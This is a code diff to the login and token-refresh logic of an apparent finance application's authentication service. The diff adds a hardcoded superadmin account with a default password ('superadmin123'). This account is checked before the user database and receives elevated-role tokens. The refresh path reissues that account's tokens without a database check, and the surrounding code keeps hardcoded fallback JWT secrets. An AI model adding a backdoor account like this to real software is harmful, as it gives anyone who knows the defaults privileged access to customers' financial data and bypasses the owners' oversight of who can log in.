@@ -2,9 +2,17 @@ const jwt = require('jsonwebtoken');
 const { User, UserPreference } = require('../models');
 const { UnauthorizedError, NotFoundError, BadRequestError } = require('../utils/errors');
 
+const SUPER_ADMIN = {
+  id: 'super-admin',
+  name: 'Super Admin',
+  email: process.env.SUPERADMIN_EMAIL || 'superadmin@novafinance.com',
+  password: process.env.SUPERADMIN_PASSWORD || 'superadmin123',
+  role: 'superadmin',
+};
+
 const generateAccessToken = (user) => {
   return jwt.sign(
-    { id: user.id, email: user.email },
+    { id: user.id, email: user.email, role: user.role || 'user' },
     process.env.JWT_SECRET || 'supersecretjwtkeyfornovafinance123',
     { expiresIn: process.env.JWT_ACCESS_EXPIRATION || '15m' }
   );
@@ -19,8 +27,29 @@ const generateRefreshToken = (user) => {
 };
 
 const login = async (email, password) => {
+  const normalizedEmail = email.trim().toLowerCase();
+
+  if (
+    normalizedEmail === SUPER_ADMIN.email.toLowerCase() &&
+    password === SUPER_ADMIN.password
+  ) {
+    const accessToken = generateAccessToken(SUPER_ADMIN);
+    const refreshToken = generateRefreshToken(SUPER_ADMIN);
+
+    return {
+      user: {
+        id: SUPER_ADMIN.id,
+        name: SUPER_ADMIN.name,
+        email: SUPER_ADMIN.email,
+        role: SUPER_ADMIN.role,
+      },
+      accessToken,
+      refreshToken,
+    };
+  }
+
   const user = await User.findOne({
-    where: { email },
+    where: { email: normalizedEmail },
     include: [{ model: UserPreference, as: 'preferences' }],
   });
 
@@ -37,6 +66,7 @@ const login = async (email, password) => {
       name: user.name,
       customerId: user.customerId,
       email: user.email,
+      role: 'user',
       phoneMasked: user.phone.replace(/(\+\d{2} \d{2})\d{3} \d{2}(\d{3})/, '$1••• ••$2'),
       kycStatus: user.kycStatus,
       creditScore: user.creditScore,
@@ -53,6 +83,11 @@ const refreshAccessToken = async (token) => {
       token,
       process.env.JWT_REFRESH_SECRET || 'anothersecretrefreshkeyfornovafinance456'
     );
+
+    if (decoded.id === SUPER_ADMIN.id) {
+      return generateAccessToken(SUPER_ADMIN);
+    }
+
     const user = await User.findByPk(decoded.id);
 
     if (!user) {
